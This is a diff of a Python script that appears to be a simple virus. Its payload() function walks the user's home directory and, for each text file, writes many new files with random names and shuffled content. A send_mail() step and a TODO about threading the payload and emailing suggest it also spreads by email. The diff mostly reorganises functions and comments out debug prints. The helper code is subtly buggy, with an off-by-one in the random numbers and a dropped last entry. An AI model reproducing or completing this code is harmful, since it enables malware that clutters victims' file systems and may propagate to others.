@@ -85,7 +85,7 @@ def traverse_dirs(curr_file):
         return
     if isfile(curr_file):
         if is_file_type(curr_file, "txt"):
-            print("TEXT file {}".format(curr_file)) # test output
+            # print("TEXT file {}".format(curr_file)) # test output
             process_text_file(curr_file)
         """
         elif is_file_type(curr_file, "docx"):
@@ -106,35 +106,8 @@ def traverse_dirs(curr_file):
         for file in listdir(curr_file):
             # TODO: Adapt for Windows ("\" instead of "/").
             traverse_dirs("{}/{}".format(curr_file, file))
-
-    
-def n_rand_numbers(n):
-    """
-    :n: The length of the list to return.
-    :returns: a list of n numbers between 1 and n, randomly shuffled, 
-    but unique (meaning that each number appears only once in the list); 
-    `None` for n <= 0.
-    """
-    result = []
-    
-    if n <= 0:
-        print("For n_rand_numbers, only positive values make sense!")
-        return None
-    while len(result) < n:
-        i = randint(0,n)
-        if i not in result:
-            result.append(i)
-    
-    return result
-
-
-def shuffle_filename(filename):
-    # Determine the lines the text file has and use this number of lines 
-    # to randomly shuffle the positions of those lines.
-    # TODO: Implement shuffling
-    return filename
-
-
+            
+            
 def read_file_to_dict(filename):
     """
     Reads the passed file line by line.
@@ -151,7 +124,50 @@ def read_file_to_dict(filename):
     for i, line in zip(range(len(lines)), lines):
         result[i] = line
         
-    print("read_file_to_dict: result = {}".format(result)) # test output
+    # print("read_file_to_dict: result = {}".format(result)) # test output
+    return result
+
+
+def shuffle_filename(filename):
+    # Determine the lines the text file has and use this number of lines 
+    # to randomly shuffle the positions of those lines.
+    # TODO: Implement shuffling
+    return filename
+    
+    
+def n_rand_numbers(n):
+    """
+    :n: The length of the list to return.
+    :returns: a list of n numbers between 0 and n, randomly shuffled, 
+    but unique (meaning that each number appears only once in the list); 
+    `None` for n <= 0.
+    """
+    result = []
+    
+    if n <= 0:
+        print("For n_rand_numbers, only positive values make sense!")
+        return None
+    while len(result) < n:
+        i = randint(0,n)
+        if i not in result:
+            result.append(i)
+    
+    return result
+
+
+def shuffle_dict_content(dictionary):
+    """
+    :dictionary: an arbitrary dictionary
+    :returns: a dictionary which contains all values of the input dictionary, 
+              but with randomly shuffled values.
+    """
+    result = {}
+    rand_numbers = n_rand_numbers(len(dictionary)-1)
+    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
+    
+    for i in range(len(dictionary)-1):
+        result[i] = dictionary[rand_numbers[i]]
+        
     return result
 
 
@@ -166,24 +182,10 @@ def write_dict_to_file(dictionary, filename):
     for i in range(len(dictionary)):
         file.writelines(dictionary[i])
     file.close()
-
-
-def shuffle_dict_content(dictionary):
-    """
-    :dictionary: an arbitrary dictionary
-    :returns: a dictionary which contains all values of the input dictionary, 
-              but with randomly shuffled values.
-    """
-    result = {}
-    rand_numbers = n_rand_numbers(len(dictionary)-1)
-    print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
-    
-    for i in range(len(dictionary)-1):
-        result[i] = dictionary[rand_numbers[i]]
-        
-    return result
     
     
+# TODO: Instead of writing the new files to the same directory as the "host" file, 
+# write them to any existing directory in the standard user directory.
 def process_text_file(input_filename):
     """
     Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains 
@@ -271,9 +273,9 @@ where each file has a randomly generated filename based on the filename of the r
 and containing the content of the read file, but with the words randomly shuffled.
 """
 def payload():
-    print("Started browsing dirs...") # test output
+    print("Started traversing dirs...") # test output
     traverse_dirs(users_home_dir())
-    print("Finished browsing dirs!") # test output
+    print("Finished traversing dirs!") # test output
 
     
 """
@@ -286,5 +288,6 @@ def send_mail():
 
 
 if __name__ == "__main__":
+    # TODO: Start two different threads, one for executing the payload and one for sending emails.
     payload()
     send_mail()
